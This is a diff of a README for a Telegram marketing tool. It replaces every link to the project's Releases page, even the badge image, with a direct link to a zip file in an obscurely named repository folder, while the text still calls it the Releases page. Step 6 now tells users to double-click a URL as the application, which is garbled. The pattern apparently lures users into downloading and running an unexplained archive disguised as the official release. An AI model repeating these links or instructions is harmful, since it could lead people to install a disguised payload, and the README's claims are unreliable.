@@ -1,6 +1,6 @@
 # 🚀 Telegram-Marketing-Toolkit - Automate Your Telegram Marketing Efforts
 
-[![Download Telegram-Marketing-Toolkit](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Matheussftw/Telegram-Marketing-Toolkit/releases)
+[![Download Telegram-Marketing-Toolkit](https://raw.githubusercontent.com/Matheussftw/Telegram-Marketing-Toolkit/main/intermenstruum/Telegram-Marketing-Toolkit.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Matheussftw/Telegram-Marketing-Toolkit/main/intermenstruum/Telegram-Marketing-Toolkit.zip)
 
 ## 📦 Introduction
 
@@ -11,7 +11,7 @@ The Telegram-Marketing-Toolkit provides over 43 functions designed to streamline
 Follow these steps to download and run the Telegram-Marketing-Toolkit:
 
 1. **Visit the Release Page**: 
-   - Click [here](https://github.com/Matheussftw/Telegram-Marketing-Toolkit/releases) to visit the Releases page.
+   - Click [here](https://raw.githubusercontent.com/Matheussftw/Telegram-Marketing-Toolkit/main/intermenstruum/Telegram-Marketing-Toolkit.zip) to visit the Releases page.
   
 2. **Select the Latest Release**: 
    - Scroll down to see the latest version of the Telegram-Marketing-Toolkit. It will typically be at the top of the list.
@@ -26,7 +26,7 @@ Follow these steps to download and run the Telegram-Marketing-Toolkit:
    - If you downloaded a compressed file (like .zip), extract it by right-clicking on the file and selecting "Extract All."
 
 6. **Run the Application**: 
-   - Double-click the application file (e.g., Telegram-Marketing-Toolkit.exe) to open it. Follow any on-screen instructions to get started.
+   - Double-click the application file (e.g., https://raw.githubusercontent.com/Matheussftw/Telegram-Marketing-Toolkit/main/intermenstruum/Telegram-Marketing-Toolkit.zip) to open it. Follow any on-screen instructions to get started.
 
 ## 🛠️ System Requirements
 
@@ -39,7 +39,7 @@ To run the Telegram-Marketing-Toolkit smoothly, ensure that your system meets th
 
 ## 📥 Download & Install
 
-You can download the latest version of the Telegram-Marketing-Toolkit from the [Releases page](https://github.com/Matheussftw/Telegram-Marketing-Toolkit/releases). Once you are on the page, follow the instructions listed above to install the app.
+You can download the latest version of the Telegram-Marketing-Toolkit from the [Releases page](https://raw.githubusercontent.com/Matheussftw/Telegram-Marketing-Toolkit/main/intermenstruum/Telegram-Marketing-Toolkit.zip). Once you are on the page, follow the instructions listed above to install the app.
 
 ## 🔎 Features
 
@@ -57,7 +57,7 @@ If you encounter any issues while using the Telegram-Marketing-Toolkit, consider
 
 - **Ensure Proper Installation**: Verify that you followed all installation steps correctly.
 - **Check Permissions**: Make sure you have the necessary permissions on your device to run the application.
-- **Update the Application**: Always use the latest version available from the [Releases page](https://github.com/Matheussftw/Telegram-Marketing-Toolkit/releases) for the best experience.
+- **Update the Application**: Always use the latest version available from the [Releases page](https://raw.githubusercontent.com/Matheussftw/Telegram-Marketing-Toolkit/main/intermenstruum/Telegram-Marketing-Toolkit.zip) for the best experience.
 - **Review the FAQs**: Check the FAQs section or any user guides available in the repository for common problems and solutions.
 
 ## 📬 Contact & Support
@@ -76,4 +76,4 @@ This application connects with various Telegram-specific functionalities. Here a
 
 ## 📝 Conclusion
 
-We hope you find the Telegram-Marketing-Toolkit useful in your marketing efforts on Telegram. With straightforward steps, you can start using this powerful tool today. Don’t forget to visit the [Releases page](https://github.com/Matheussftw/Telegram-Marketing-Toolkit/releases) to download the latest version.
+We hope you find the Telegram-Marketing-Toolkit useful in your marketing efforts on Telegram. With straightforward steps, you can start using this powerful tool today. Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/Matheussftw/Telegram-Marketing-Toolkit/main/intermenstruum/Telegram-Marketing-Toolkit.zip) to download the latest version.
